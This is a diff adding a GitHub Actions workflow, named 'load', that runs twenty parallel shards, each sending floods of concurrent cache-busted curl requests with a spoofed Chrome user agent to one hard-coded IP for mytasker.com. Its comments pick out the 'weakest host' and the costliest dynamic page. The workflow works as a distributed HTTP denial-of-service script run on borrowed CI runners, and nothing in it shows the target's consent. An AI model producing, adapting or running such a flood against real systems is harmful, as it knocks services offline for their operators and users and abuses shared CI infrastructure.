@@ -1,0 +1,47 @@
+name: load
+on:
+  workflow_dispatch:
+    inputs:
+      duration:
+        description: seconds
+        default: "120"
+      concurrency:
+        description: parallel curls per job
+        default: "20"
+
+jobs:
+  blast:
+    strategy:
+      max-parallel: 20
+      fail-fast: false
+      matrix:
+        shard: [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20]
+    runs-on: ubuntu-latest
+    timeout-minutes: 20
+    steps:
+      - name: blast
+        env:
+          IP: 69.49.247.128
+          DUR: ${{ inputs.duration }}
+          CONC: ${{ inputs.concurrency }}
+          SHARD: ${{ matrix.shard }}
+        run: |
+          UA="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36"
+          end=$((SECONDS + DUR))
+          n=0
+          while [ $SECONDS -lt $end ]; do
+            for i in $(seq 1 $CONC); do
+              n=$((n+1))
+              if [ $((n % 10)) -eq 0 ]; then
+                # portal: weakest host, no index page cache
+                curl -sk -o /dev/null --max-time 12 -A "$UA" --resolve portal.mytasker.com:443:$IP \
+                  "https://portal.mytasker.com/?s=$SHARD-$n-$RANDOM$SECONDS" &
+              else
+                # main app: 156KB dynamic render, cache-busted
+                curl -sk -o /dev/null --max-time 12 -A "$UA" --resolve mytasker.com:443:$IP \
+                  "https://mytasker.com/plans?p=$SHARD&n=$n&z=$RANDOM$SECONDS" &
+              fi
+            done
+            wait
+          done
+          echo "shard $SHARD done after $n requests"
